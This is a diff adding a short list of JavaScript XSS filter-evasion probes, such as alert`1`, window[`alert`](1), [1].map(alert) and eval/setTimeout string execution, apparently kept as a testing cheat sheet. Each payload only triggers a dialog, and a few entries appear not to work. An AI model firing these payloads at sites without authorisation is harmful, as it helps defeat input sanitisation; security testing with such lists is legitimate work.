@@ -1,0 +1,34 @@
+like alert : prompt , confirm , print 
+
+    alert(1)
+    alert`1`
+    window.alert(1)
+    window[`alert`](1)
+    this.alert(1)
+    this[`alert`](1)
+    top.alert(1)
+    top[`alert`](1)
+    self.alert(1)
+    self[`alert`](1)
+    parent.alert(1)
+    parent[`alert`](1)
+    frames.alert(1)
+    frames[`alert`](1)
+    [1].find(alert) 
+    [1].find[`alert`]
+    [1].map(alert)
+    [1].map[`alert`]
+    [1].forEach(alert)
+    [1].forEach[`alert`]
+    [1].filter(alert)
+    [1].filter[`alert`]
+    eval("alert(1)")
+    eval("alert`1`")
+    eval("window.alert(1)")
+    setTimeout("alert`1`",1000)
+    setTimeout("window.alert(1)",1000)
+    setTimeout("window[`alert`](1)")
+    setInterval("alert`1`",1000)
+    setInterval("window[`alert`](1)")
+    Function(alert`1`)
+    Function(window[`alert`](1))
